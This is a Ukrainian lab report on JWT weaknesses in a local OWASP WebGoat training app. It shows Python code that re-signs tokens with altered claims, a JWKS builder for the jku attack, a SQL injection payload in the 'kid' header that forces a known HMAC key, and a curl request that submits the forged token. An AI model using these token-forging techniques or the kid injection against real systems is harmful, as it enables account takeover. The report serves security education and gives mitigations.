# Звіт з дослідження JWT у навчальному застосунку OWASP WebGoat

## Мета: Ознайомлення з механізмами JWT та дослідження вразливостей їх використання

### Середовище: Windows 11, Oracle VirtualBox, Kali Linux 2026.3, Docker Engine, OWASP WebGoat і WebWolf, Mozilla Firefox, Hashcat, Python 3.

### Концепція

**JSON Web Token (JWT)** — компактний формат передавання тверджень (*claims*) між учасниками взаємодії, що часто застосовується в автентифікації та авторизації. Підписаний JWT дає змогу перевірити цілісність вмісту токена, але не забезпечує його конфіденційності: заголовок і дані звичайного JWT можна прочитати після декодування Base64URL. Безпека залежить від перевірки підпису, правильного вибору алгоритму, захисту ключа та керування строком дії токенів.

### Цілі

- Розгорнути Kali Linux на віртуальній машині, а WebGoat — **саме в Docker-контейнері всередині Kali**.
- Ознайомитися з будовою JWT, заголовком, payload та підписом.
- На навчальних прикладах продемонструвати неправильну перевірку підпису, слабкий секретний ключ, проблеми оновлення токенів, а також маніпуляції із заголовками `jku` та `kid`.
- Зафіксувати хід виконання завдань, результати та способи захисту.

### Основні терміни

- **JWT (JSON Web Token)** — токен у стандартизованому компактному форматі.
- **Header** — заголовок, що містить службову інформацію про алгоритм (`alg`).
- **Payload / Claims** — твердження про користувача, права та інші дані.
- **Signature** — підпис, що захищає цілісність токена.
- **HMAC / HS256 / HS512** — алгоритми формування і перевірки підпису зі спільним секретним ключем.
- **Access Token** — токен доступу до ресурсу.
- **Refresh Token** — токен, що використовується для отримання нового Access Token.
- **JSESSIONID** — ідентифікатор серверної вебсесії.
- **Dictionary attack** — підбір секрету за підготовленим словником.
- **JKU (JSON Web Key URL)** — посилання на набір відкритих ключів JWKS, з якого сервер може отримувати ключ перевірки підпису.
- **KID (Key ID)** — ідентифікатор ключа, за яким система вибирає ключ для перевірки JWT.
- **JWKS** — набір відкритих ключів у форматі JSON.

## 2. Ознайомлення з JWT

### Структура токена

На сторінці **2 — Structure of a JWT token** розглянуто три складові підписаного JWT:

```text
BASE64URL(Header).BASE64URL(Payload).BASE64URL(Signature)
```

`Header` визначає метадані токена та алгоритм підпису, `Payload` містить claims, а `Signature` дає змогу перевірити, чи не змінювали підписані дані. Наявність підпису сама по собі не гарантує захист: сервер повинен **коректно перевіряти** його перед наданням доступу.

Для формування нового токена застосовано Python з модулями `base64`, `hmac`, `hashlib`, `json` та `pathlib`. Скрипт перевіряв підпис вихідного JWT, змінював тільки claim `username` на `WebGoat`, після чого генерував новий підпис HMAC-SHA256.

Під час роботи з'ясувалося, що після перезапуску контейнера потрібно брати свіжий токен та повторно визначати його секрет. Після цього сформований JWT пройшов перевірку WebGoat.

Основна частина перевірки та підписування виглядала так:

```python
import base64
import hashlib
import hmac
import json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def signature(message: str, secret: str) -> str:
    raw = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    return b64url(raw)

# header і payload беруться із вихідного JWT.
# claims декодуються, а далі змінюється лише username.
claims['username'] = 'WebGoat'
new_payload = b64url(json.dumps(claims, separators=(',', ':')).encode())
new_message = header + '.' + new_payload
new_token = new_message + '.' + signature(new_message, secret)
```

Це скорочений фрагмент для пояснення принципу; фактично використовувався локальний скрипт `~/jwt_sign.py`.

## 9. Теоретичні сторінки 14–15 — Claim misuse та JKU

На **сторінці 14** розглянуто підміну claims у JWT. Уразливості виникають, коли застосунок без належної перевірки приймає змінені ролі користувача, ідентифікатор облікового запису або строк дії токена. Окремо розібрано повторне використання токенів та зловживання ідентифікатором ключа `kid`.

У файлі `make_jwks.py` відкритий RSA-ключ перетворено на формат JSON Web Key: до набору `keys` додано `kty`, `kid`, `use`, `alg`, модуль `n` та експоненту `e`. Для ідентифікатора ключа використано `lab-key`.

Основний фрагмент створення JWKS:

```python
import json
import base64
from pathlib import Path
from cryptography.hazmat.primitives import serialization

def b64url(number):
    value = number.to_bytes((number.bit_length() + 7) // 8, "big")
    return base64.urlsafe_b64encode(value).decode().rstrip("=")

public_key = serialization.load_pem_public_key(
    (Path.home() / "jku_public.pem").read_bytes()
)
numbers = public_key.public_numbers()
jwks = {
    "keys": [{
        "kty": "RSA", "kid": "lab-key", "use": "sig", "alg": "RS256",
        "n": b64url(numbers.n), "e": b64url(numbers.e)
    }]
}
(Path.home() / "jwks.json").write_text(json.dumps(jwks, indent=2))
```

## 12. Практичне завдання: сторінка 18 — JWT with KID version

### Постановка завдання

Як і в попередньому випадку, є облікові записи **Jerry** і **Tom**. Потрібно сформувати JWT, який дозволить виконати дію над обліковим записом Tom. Цього разу вразливість пов'язана не з адресою зовнішнього JWKS, а з параметром `kid` та пошуком секретного ключа.

![скрин64](скрин64.png)

*Скриншот 64 — сторінка 18, завдання JWT with KID version.*

### Хід виконання

У Firefox відкрито **Network** та виконано натискання `Delete` біля Tom. У запиті `POST /WebGoat/JWT/kid/delete?token=...` передавався JWT. Початковий запит не пройшов перевірку підпису. У відповіді отримано `lessonCompleted: false`, повідомлення `Not a valid JWT token` та помилку `JWT signature does not match locally computed signature`.

![скрин65](скрин65.png)

*Скриншот 65 — початкова невдала перевірка токена на сторінці 18.*

JWT перенесено у WebWolf. У декодованому заголовку виявлено:

```json
{
  "alg": "HS256",
  "kid": "webgoat_key",
  "typ": "JWT"
}
```

У Payload зазначені `Email: jerry@webgoat.com`, `Role: ["Cat"]`, `username: Jerry`. На відміну від завдання з JKU, для підпису тут використовується **HMAC-SHA256**, тобто симетричний секретний ключ.

![скрин66](скрин66.png)

*Скриншот 66 — декодований токен Jerry: HS256 та KID `webgoat_key`.*

Початковий JWT збережено у файл `~/jerry_kid.txt`. У межах цієї навчальної вправи значення `kid` можна використати для SQL-ін'єкції під час вибору секрету. Було створено `make_kid_token.py`, у якому змінено `username` на Tom і підставлено власний ключ `mykey` (його представлення Base64 — `bXlrZXk=`):

```python
header["alg"] = "HS256"
header["kid"] = (
    "x' UNION SELECT 'bXlrZXk=' "
    "FROM jwt_keys WHERE id='webgoat_key' -- "
)
payload["username"] = "Tom"
```

У цьому прикладі SQL-ін'єкція змінює вибір ключа перевірки; сформований токен підписано тим самим відомим секретом `mykey`:

```python
import hmac
import hashlib
import base64

message = header64 + "." + payload64
signature = hmac.new(b"mykey", message.encode(), hashlib.sha256).digest()
signature64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
new_token = message + "." + signature64
```

Токен збережено у `~/kid_tom_jwt.txt`. Після запуску `python3 ~/make_kid_token.py` отримано `SUCCESS: JWT created!`, `Username: Tom`, `Algorithm: HS256`, `JWT parts: 3`.

![скрин67](скрин67.png)

*Скриншот 67 — створення JWT із SQL-ін'єкцією в параметрі KID.*

Токен передано на навчальний endpoint без ручного копіювання:

```bash
curl -sS -X POST "http://127.0.0.1:8080/WebGoat/JWT/kid/delete" \
  -H "Cookie: JSESSIONID=<значення сесії WebGoat>" \
  --data-urlencode "token=$(tr -d '\r\n' < ~/kid_tom_jwt.txt)" \
  -w "\nHTTP status: %{http_code}\n"
```

Отримано відповідь `HTTP status: 200`, `lessonCompleted: true` і `Congratulations. You have successfully completed the assignment.`. У навігації WebGoat сторінка 18 змінила колір на зелений.

![скрин68](скрин68.png)

*Скриншот 68 — успішне виконання завдання 18: `lessonCompleted: true`.*

**Висновок до завдання:** значення `kid` не можна прямо підставляти в SQL-запити. Для вибору ключів потрібно використовувати параметризовані запити, суворо обмежений набір ідентифікаторів та перевіряти підпис JWT до виконання будь-яких дій від імені користувача.

| **13** | Refreshing a token | Оновлено токен користувача Tom, оформлено навчальне замовлення |
| **16** | JWT with JKU version | Сервер прийняв токен, підписаний власним RSA-ключем через JKU |
| **18** | JWT with KID version | Через SQL-ін'єкцію в KID підставлено відомий секрет і змінено JWT |

Загалом виконано **7 практичних завдань із 7**. Сторінки з поясненнями та висновками (1–3, 5, 7, 9, 10, 12, 14, 15, 17, 19) також опрацьовано в межах модуля. Роботу виконано в локальному контейнері OWASP WebGoat, без тестування сторонніх ресурсів.

## 15. Загальний висновок

Під час роботи було налаштовано навчальне середовище Kali Linux у VirtualBox, встановлено Docker та запущено OWASP WebGoat разом із WebWolf. Розглянуто будову JSON Web Token, принцип формування підпису та роботу з claims. Для дослідження HTTP-запитів використано інструменти розробника Firefox, а для підписування та перевірки токенів — Python, OpenSSL і Hashcat.

У практичних завданнях вдалося побачити різні причини порушення безпеки JWT: прийняття токена без коректної перевірки підпису, використання слабкого секрету HMAC, неправильну роботу з refresh token, довіру до довільного джерела відкритого ключа через `jku` та небезпечне використання `kid` у SQL-запиті.

Головний результат роботи — розуміння того, що сама наявність JWT не гарантує безпеку. Сервер повинен самостійно контролювати алгоритм підпису, джерело ключа, цілісність токена, строк дії та права користувача. Для усунення виявлених недоліків слід застосовувати перевірені бібліотеки, параметризовані SQL-запити, довгі випадкові ключі та належне керування сесіями й токенами оновлення.

Усі завдання виконано у спеціально вразливому навчальному застосунку **OWASP WebGoat**.
